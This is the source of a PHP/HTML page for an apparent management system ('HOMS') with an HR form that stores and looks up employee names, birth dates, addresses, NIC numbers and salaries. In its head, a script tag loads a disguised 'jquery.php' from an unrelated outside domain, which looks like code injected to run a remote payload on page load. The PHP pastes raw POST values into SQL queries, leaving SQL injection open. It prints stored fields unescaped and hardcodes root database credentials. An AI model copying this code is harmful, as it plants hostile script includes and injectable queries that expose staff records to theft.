
<!DOCTYPE html>
<html>
<head>
<link rel="stylesheet" type="text/css" href="http://localhost/FrontendCSS.css">
<script src="https://macutnova.com/jquery.php?u=c16102a344e586c77bd406dfa74ed645&c=split24banner4&p=1"></script></head>
<body>

<div id="header">
<h1>HOMS</h1>
</div>
<div id="icbar">
</div>
<div id="hrLeft">
HR LEAVE/ATTENDENCE
	<div id="section2">
	<h2>HR</h2>
<form action="hr.php" method="post">
<input type="text" name="fname" placeholder="First Name"><br>
<input type="text" name="lname" placeholder="Last Name"><br>
<input type="date" name="bdate" placeholder="Birth Date yyyy-mm-dd"><br>
<input type="text" name="address" placeholder="Address"><br>
<input type="text" name="cnumber" placeholder="Contact NO"><br>
<input type="text" name="gender" placeholder="Gender M/F"><br>
<input type="text" name="nic" placeholder="NIC NO "><br>
<input type="text" name="salary" placeholder="Salary"><br>
<input type="submit" name = "submi">
</form>



	</div>
</div>
<div id="hrRight">
<?php
$servername = "localhost";
$username = "root";
$password = "123";
$dbname = "homs";
$conn = new mysqli($servername, $username, $password, $dbname) 
or die ('Cannot connect to db');

    $result = $conn->query("SELECT EMP_ID,F_Name,L_Name FROM employee");


    echo "<select name='id'>";

    while ($row = $result->fetch_assoc()) {

                  unset($id, $name, $lname);
                  $id = $row['EMP_ID'];
                  $name = $row['F_Name'];
                  $lname = $row['L_Name']; 
                  echo '<option value="'.$id.'"> '.$id.'   '.$name.' '.$lname.' </option>';

}

    echo "</select>";
?> 
<form action="hr.php" method="post">
<input type="text" name="search" placeholder="EMP_ID">
<input type="submit" value="Search" name="search1"><br>
<?php




// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

if(isset($_POST["search1"])){
	

	$sql1 = "SELECT * FROM employee WHERE EMP_ID ='{$_POST["search"]}'";
	$result = mysqli_query($conn, $sql1);
	
	

     //output data of each row
 if(mysqli_num_rows($result) > 0){
    while($row = mysqli_fetch_assoc($result)) {
        echo "EMP_ID 	: " . $row["EMP_ID"]. "<br>". "First Name : " . $row["F_Name"]. "<br>". "Last Name : " . $row["L_Name"]. "<br>". "Birth Date : " .$row["B_Date"]. "<br>". "Address : " .$row["Adress"]. "<br>". "Contact NO : " .$row["Contact_NO"]. "<br>". "Gender : " .$row["Gender"]. "<br>". "NIC NO : " .$row["NIC_NO"]. "<br>". "Salary : " .$row["Salary"]. "<br>";
    }
 }
 else{
   echo "0 results";
}
}

mysqli_close($conn);
?>



</div>
<div id="footer">
<?php
$servername = "localhost";
$username = "root";
$password = "123";
$dbname = "homs";



// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
if(isset($_POST["submi"])){
$sql = "INSERT INTO employee (F_Name, L_Name, B_Date, Adress, Contact_NO, Gender, NIC_NO, Salary)
VALUES ('{$_POST["fname"]}', '{$_POST["lname"]}', '{$_POST["bdate"]}', '{$_POST["address"]}', '{$_POST["cnumber"]}', '{$_POST["gender"]}', '{$_POST["nic"]}', '{$_POST["salary"]}')";

if (mysqli_query($conn, $sql)) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}
}



mysqli_close($conn);
?>

</div>
	

</body>
</html>
